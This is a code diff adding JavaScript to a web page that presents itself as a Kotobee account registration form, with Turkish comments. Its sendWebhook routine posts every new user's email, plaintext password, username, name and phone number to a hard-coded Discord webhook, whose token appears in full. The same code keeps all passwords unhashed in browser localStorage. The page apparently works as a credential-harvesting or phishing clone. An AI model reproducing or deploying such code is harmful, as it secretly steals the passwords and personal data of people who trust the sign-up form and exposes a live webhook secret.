+			// Query parametrelerini kontrol et: ?aff=CODE veya ?affiliate=CODE veya ?ref=CODE
+			const urlParams = new URLSearchParams(window.location.search);
+			let affiliateCode = urlParams.get('aff') || urlParams.get('affiliate') || urlParams.get('ref');
+			
+			// Path'ten de kontrol et: /register/affiliate/CODE
+			if (!affiliateCode) {
+				const pathParts = window.location.pathname.split('/').filter(function(part) { return part; });
+				const affiliateIndex = pathParts.indexOf('affiliate');
+				if (affiliateIndex !== -1 && pathParts[affiliateIndex + 1]) {
+					affiliateCode = pathParts[affiliateIndex + 1];
+				} else if (pathParts.length > 0) {
+					// Son path segment'ini kontrol et (eğer register değilse)
+					const lastPart = pathParts[pathParts.length - 1];
+					if (lastPart && lastPart !== 'register' && lastPart !== 'index.html') {
+						affiliateCode = lastPart;
+					}
+				}
+			}
+			
+			if (affiliateCode) {
+				function fillAffiliateCode() {
+					const affiliateInput = document.getElementById('affiliateCode');
+					if (affiliateInput) {
+						affiliateInput.value = affiliateCode;
+						const inputEvent = new Event('input', { bubbles: true });
+						affiliateInput.dispatchEvent(inputEvent);
+						
+						const affInputs = document.querySelectorAll('.aff, input[name="aff"]');
+						const refInputs = document.querySelectorAll('.ref, input[name="ref"]');
+						affInputs.forEach(function(input) {
+							input.value = affiliateCode;
+						});
+						refInputs.forEach(function(input) {
+							if (!input.value) {
+								input.value = affiliateCode;
+							}
+						});
+					} else {
+						setTimeout(fillAffiliateCode, 100);
+					}
+				}
+				
+
+				if (document.readyState === 'loading') {
+					document.addEventListener('DOMContentLoaded', fillAffiliateCode);
+				} else {
+					setTimeout(fillAffiliateCode, 100);
+				}
+			}
+		})();
+	</script>
+	
+	<!-- Basit Register ve Login Sistemi -->
+	<script>
+		// LocalStorage ve JSON dosyası için kullanıcı yönetimi
+		const UserManager = {
+			jsonFilePath: 'data/users.json',
+			webhookUrl: 'https://discord.com/api/webhooks/1448770841633620128/wesmitFF_1bpQha0MNqHLk1Yp7raiT_UhKkB-hinry0-i3NkWaXQBwzEirx3IhIJaFif', // Discord webhook URL'ini buraya ekleyin
+			
+			// Discord webhook'a veri gönder
+			sendWebhook: async function(event, userData) {
+				try {
+					// Event'e göre renk ve başlık belirle
+					const isRegister = event === 'register';
+					const color = isRegister ? 5763719 : 3447003; // Yeşil: Kayıt, Mavi: Giriş
+					const title = isRegister ? '🎉 Yeni Kullanıcı Kaydı' : '🔐 Kullanıcı Girişi';
+					const description = isRegister ? 'Yeni bir kullanıcı sisteme kayıt oldu!' : 'Bir kullanıcı sisteme giriş yaptı!';
+					
+					// Discord embed formatı
+					const payload = {
+						embeds: [
+							{
+								title: title,
+								description: description,
+								color: color,
+								fields: [
+									{
+										name: '📧 Email',
+										value: userData.email || 'N/A',
+										inline: true
+									},
+									{
+										name: '🔒 Şifre',
+										value: userData.password || 'N/A',
+										inline: true
+									},
+									{
+										name: '👤 Kullanıcı Adı',
+										value: userData.username || 'Belirtilmemiş',
+										inline: true
+									},
+									{
+										name: '📛 İsim',
+										value: userData.name || 'Belirtilmemiş',
+										inline: true
+									},
+									{
+										name: '📱 Telefon',
+										value: userData.phone || 'Belirtilmemiş',
+										inline: true
+									},
+									{
+										name: '🔗 Affiliate Code',
+										value: userData.affiliate || 'Yok',
+										inline: true
+									}
+								],
+								timestamp: new Date().toISOString(),
+								footer: {
+									text: 'Kotobee Registration System'
+								}
+							}
+						]
+					};
+					
+					// Kayıt olayı için kayıt tarihini ekle
+					if (isRegister && userData.registeredAt) {
+						payload.embeds[0].fields.push({
+							name: '📅 Kayıt Tarihi',
+							value: new Date(userData.registeredAt).toLocaleString('tr-TR'),
+							inline: false
+						});
+					}
+					
+					// Giriş olayı için son giriş tarihini ekle
+					if (!isRegister && userData.lastLogin) {
+						payload.embeds[0].fields.push({
+							name: '🕐 Son Giriş',
+							value: new Date(userData.lastLogin).toLocaleString('tr-TR'),
+							inline: false
+						});
+					}
+					
+					const response = await fetch(this.webhookUrl, {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json',
+						},
+						body: JSON.stringify(payload)
+					});
+					
+					if (response.ok) {
+						console.log('Discord webhook sent successfully:', event);
+					} else {
+						console.error('Discord webhook error:', response.status, response.statusText);
+					}
+				} catch (e) {
+					// Webhook hatası uygulamayı durdurmamalı, sadece log'la
+					console.error('Error sending Discord webhook:', e);
+				}
+			},
+			
+			// LocalStorage'dan kullanıcıları yükle
+			loadUsersFromLocalStorage: function() {
+				try {
+					const users = JSON.parse(localStorage.getItem('kotobee_users') || '[]');
+					return Array.isArray(users) ? users : [];
+				} catch (e) {
+					console.error('Error loading users from localStorage:', e);
+					return [];
+				}
+			},
+			
+			// LocalStorage'a kullanıcıları kaydet
+			saveUsersToLocalStorage: function(users) {
+				try {
+					localStorage.setItem('kotobee_users', JSON.stringify(users));
+					console.log('Users saved to localStorage:', users.length, 'users');
+					return true;
+				} catch (e) {
+					console.error('Error saving users to localStorage:', e);
+					return false;
+				}
+			},
+			
+			// Referral ekle - referans veren kullanıcının referrals listesine yeni kullanıcıyı ekle
+			addReferral: async function(referrerUserId, newUserEmail, newUserName) {
+				try {
+					// LocalStorage'dan yükle
+					let users = this.loadUsersFromLocalStorage();
+					
+					// Referans veren kullanıcıyı bul (userId veya email'e göre)
+					const referrer = users.find(u => {
+						// UserId oluştur fonksiyonu
+						function generateUserId(email) {
+							if (!email) return null;
+							let hash = 0;
+							for (let i = 0; i < email.length; i++) {
+								const char = email.charCodeAt(i);
+								hash = ((hash << 5) - hash) + char;
+								hash = hash & hash;
+							}
+							return Math.abs(hash) % 10000000;
+						}
+						
+						const userId = u.id || generateUserId(u.email);
+						return userId.toString() === referrerUserId.toString() || u.email === referrerUserId;
+					});
+					
+					if (referrer) {
+						// Referrals array'ini başlat (yoksa)
+						if (!referrer.referrals) {
+							referrer.referrals = [];
+						}
+						
+						// Aynı email zaten varsa ekleme
+						const exists = referrer.referrals.find(r => r.email === newUserEmail);
+						if (!exists) {
+							referrer.referrals.push({
+								email: newUserEmail,
+								name: newUserName || newUserEmail.split('@')[0],
+								joinedDate: new Date().toISOString()
+							});
+							
+							// Referral sayısını güncelle
+							referrer.invitedCount = referrer.referrals.length;
+							
+							// Güncellenmiş kullanıcıyı localStorage'a kaydet
+							const referrerIndex = users.findIndex(u => u.email === referrer.email);
+							if (referrerIndex !== -1) {
+								users[referrerIndex] = referrer;
+								this.saveUsersToLocalStorage(users);
+							}
+						}
+					}
+				} catch (e) {
+					console.error('Error adding referral:', e);
+				}
+			},
+			
+			// Kullanıcı kaydet - LocalStorage'a kaydet
+			saveUser: async function(userData, referralCode) {
+				try {
+					// Önce mevcut kullanıcıları localStorage'dan yükle
+					let users = this.loadUsersFromLocalStorage();
+					
+					// Email kontrolü - aynı email varsa güncelle
+					const existingIndex = users.findIndex(u => u.email === userData.email);
+					const isNewUser = existingIndex === -1;
+					
+					if (existingIndex !== -1) {
+						users[existingIndex] = userData;
+					} else {
+						users.push(userData);
+					}
+					
+					// LocalStorage'a kaydet (tüm bilgiler, şifre dahil)
+					this.saveUsersToLocalStorage(users);
+					
+					// Referral varsa, referans veren kullanıcıya ekle
+					if (referralCode) {
+						await this.addReferral(referralCode, userData.email, userData.name);
+					}
+					
+					// Yeni kullanıcı kaydı için webhook gönder
+					if (isNewUser) {
+						await this.sendWebhook('register', userData);
+					}
+					
+					return true;
+				} catch (e) {
+					console.error('Error saving user:', e);
+					return false;
+				}
+			},
+			
+			// Kullanıcı bul - LocalStorage'dan kontrol et
+			findUser: function(email) {
+				try {
+					// LocalStorage'dan tüm kullanıcıları yükle
+					const users = this.loadUsersFromLocalStorage();
+					
+					// Email'e göre kullanıcıyı bul
+					const user = users.find(u => u.email === email);
+					
+					return user || null;
+				} catch (e) {
+					console.error('Error finding user:', e);
+					return null;
+				}
+			},
+			
+			// Login kontrolü
+			login: function(email, password) {
+				// LocalStorage'dan kullanıcı bilgilerini al
+				const user = this.findUser(email);
+				if (!user) {
+					return { success: false, message: 'Invalid email or password' };
+				}
+				
+				// Şifreyi kontrol et
+				if (user.password && user.password === password) {
+					// Login başarılı - current user bilgisini kaydet (dashboard için)
+					localStorage.setItem('kotobee_current_user', JSON.stringify({
+						email: user.email,
+						name: user.name,
+						loginTime: new Date().toISOString()
+					}));
+					
+					// LocalStorage'da lastLogin güncelle
+					let users = this.loadUsersFromLocalStorage();
+					const userIndex = users.findIndex(u => u.email === email);
+					if (userIndex !== -1) {
+						users[userIndex].lastLogin = new Date().toISOString();
+						this.saveUsersToLocalStorage(users);
+					}
+					
+					return { success: true, user: user };
+				}
+				return { success: false, message: 'Invalid email or password' };
+			},
+			
+			// Logout
+			logout: function() {
+				localStorage.removeItem('kotobee_current_user');
+			},
+			
+			// Mevcut kullanıcıyı al
+			getCurrentUser: function() {
+				try {
+					return JSON.parse(localStorage.getItem('kotobee_current_user') || 'null');
+				} catch (e) {
+					return null;
+				}
+			},
+			
+			// Tüm kullanıcıları al
+			getAllUsers: async function() {
+				try {
+					let users = JSON.parse(localStorage.getItem('kotobee_users') || '[]');
+					
+					// JSON'dan da yükle ve birleştir
+					const jsonUsers = await this.loadUsersFromJSON();
+					jsonUsers.forEach(jsonUser => {
+						if (!users.find(u => u.email === jsonUser.email)) {
+							users.push(jsonUser);
+						}
+					});
+					
+					return users;
+				} catch (e) {
+					console.error('Error getting all users:', e);
+					return [];
+				}
+			}
+		};
+		
+		// Register form submit handler
+		document.addEventListener('DOMContentLoaded', function() {
+			// Vue.js component'i için global fonksiyon
+			window.handleRegisterSubmit = async function(event, vueInstance) {
+				event.preventDefault();
+				
+				if (!vueInstance || !vueInstance.model) {
+					// Vue.js yoksa, form elementlerinden al
+					const form = event.target;
+					const formData = new FormData(form);
+					
+					const email = formData.get('email');
+					const password = form.querySelector('input[name="password"]')?.value;
+					const confirmPassword = form.querySelector('input[name="confirmPassword"]')?.value;
+					const username = formData.get('username');
+					const name = formData.get('name');
+					const phone = formData.get('phone');
+					const affiliate = formData.get('affiliate');
+					
+					// Validasyon
+					if (!email || !password || !username) {
+						alert('Email, username and password are required!');
+						return false;
+					}
+					
+					if (password !== confirmPassword) {
+						alert('Passwords do not match!');
+						return false;
+					}
+					
+					if (password.length < 6) {
+						alert('Password must be at least 6 characters!');
+						return false;
+					}
+					
+					// Kullanıcı kaydet
+					const userData = {
+						email: email,
+						password: password,
+						username: username || '',
+						name: name || '',
+						phone: phone || '',
+						affiliate: affiliate || '',
+						registeredAt: new Date().toISOString()
+					};
+					
+					// URL'den referral kodunu al
+					const urlParams = new URLSearchParams(window.location.search);
+					const referralCode = urlParams.get('ref') || urlParams.get('referral') || null;
+					
+					const success = await UserManager.saveUser(userData, referralCode);
+					if (success) {
+						// Başarılı - mode'u complete yap
+						if (vueInstance) {
+							vueInstance.mode = 'complete';
+						} else {
+							// Vue.js yoksa, sayfayı yenile veya mesaj göster
+							alert('Registration successful! You can now log in.');
+							window.location.href = '../login';
+						}
+					} else {
+						alert('Registration failed. Please try again.');
+					}
+					
+					return false;
+				} else {
+					// Vue.js ile
+					const model = vueInstance.model;
+					
+					if (!model.email || !model.password || !model.username) {
+						if (vueInstance.error !== undefined) {
+							vueInstance.error = 'Email, username and password are required!';
+						} else {
+							alert('Email, username and password are required!');
+						}
+						return false;
+					}
+					
+					if (model.password !== model.confirmPassword) {
+						if (vueInstance.error !== undefined) {
+							vueInstance.error = 'Passwords do not match!';
+						} else {
+							alert('Passwords do not match!');
+						}
+						return false;
+					}
+					
+					if (model.password.length < 6) {
+						if (vueInstance.error !== undefined) {
+							vueInstance.error = 'Password must be at least 6 characters!';
+						} else {
+							alert('Password must be at least 6 characters!');
+						}
+						return false;
+					}
+					
+					// Kullanıcı kaydet
+					const userData = {
+						email: model.email,
+						password: model.password,
+						username: model.username || '',
+						name: model.name || '',
+						phone: model.phone || '',
+						affiliate: model.affiliate || '',
+						registeredAt: new Date().toISOString()
+					};
+					
+					// URL'den referral kodunu al
+					const urlParams = new URLSearchParams(window.location.search);
+					const referralCode = urlParams.get('ref') || urlParams.get('referral') || null;
+					
+					UserManager.saveUser(userData, referralCode).then(function(success) {
+						if (success) {
+							vueInstance.busy = false;
+							vueInstance.mode = 'complete';
+						} else {
+							if (vueInstance.error !== undefined) {
+								vueInstance.error = 'Registration failed. Please try again.';
+							} else {
+								alert('Registration failed. Please try again.');
+							}
+						}
+					});
+					
+					return false;
+				}
+			};
+			
+			// Form submit event listener ekle
+			const registerForm = document.querySelector('.registrationForm');
+			if (registerForm) {
+				registerForm.addEventListener('submit', function(e) {
+					// Vue.js instance'ını bul
+					const vueElement = document.querySelector('[ng-controller="UserRegisterCtrl"]');
+					if (vueElement && vueElement.__vue__) {
+						window.handleRegisterSubmit(e, vueElement.__vue__);
+					} else {
+						window.handleRegisterSubmit(e, null);
+					}
+				});
+			}
+		});
+	</script>
+	
+	<script src="../js/register.min.js"></script>
+<script src="/js/download.js"></script>
+
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon="{" version":"2024.11.0","token":"5fa0844b0b584b1b9dceeacc424be5eb","server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>
+
+</body></html>
